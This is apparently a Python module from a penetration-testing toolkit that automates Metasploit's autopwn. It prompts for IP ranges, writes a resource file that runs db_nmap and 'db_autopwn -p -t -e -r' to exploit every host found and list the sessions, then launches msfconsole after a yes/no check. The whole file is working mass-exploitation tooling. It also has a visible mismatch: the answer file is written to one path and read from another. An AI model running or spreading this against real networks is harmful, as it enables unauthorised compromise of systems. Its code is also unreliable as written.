#!/usr/bin/env python
# coding=utf-8
#
#
# Metasploit Autopwn functionality
#
#
import os

import pexpect

import src.core.setcore as core

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass


# this will load the database
def prep(database, ranges):
    print("\n")
    core.print_status("Prepping the answer file based on what was specified.")
    # prep the file to be written
    with open("src/program_junk/autopwn.answer", "w") as filewrite:
        core.print_status("Using the {0} sql driver for autopwn".format(database))
        filewrite.write("db_driver {0}\r\n".format(database))
        core.print_status("Autopwn will attack the following systems: {0}".format(ranges))
        filewrite.write("db_nmap {0}\r\n".format(ranges))
        filewrite.write("db_autopwn -p -t -e -r\r\n")
        filewrite.write("jobs -K\r\n")
        filewrite.write("sessions -l\r\n")
        core.print_status("Answer file has been created and prepped for delivery into Metasploit.\n")


def launch():
    """ here we cant use the path for metasploit via setcore.meta_path. If the full path is specified it breaks
            database support for msfconsole for some reason. reported this as a bug, may be fixed soon... until then
            if path variables aren't set for msfconsole this will break, even if its specified in set_config """

    # launch the attack
    core.print_status("Launching Metasploit and attacking the systems specified. This may take a moment..")
    # try/catch block
    try:
        child = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path + 'msfconsole'),
                                                          os.path.join(core.userconfigpath, "autopwn.answer")))
        child.interact()

    # handle exceptions and log them
    except Exception as error:
        core.log(error)


def do_autopwn():
    print('Doing do_autopwn')
    # pull the metasploit database
    database = core.meta_database()
    ip_range = input(core.setprompt(["19", "20"], "Enter the IP ranges to attack (nmap syntax only)"))

    # prep the answer file
    prep(database, ip_range)
    confirm_attack = input(core.setprompt(["19", "20"], "You are about to attack systems are you sure [y/n]"))

    # if we are sure, then lets do it
    if confirm_attack == "yes" or confirm_attack == "y":
        launch()
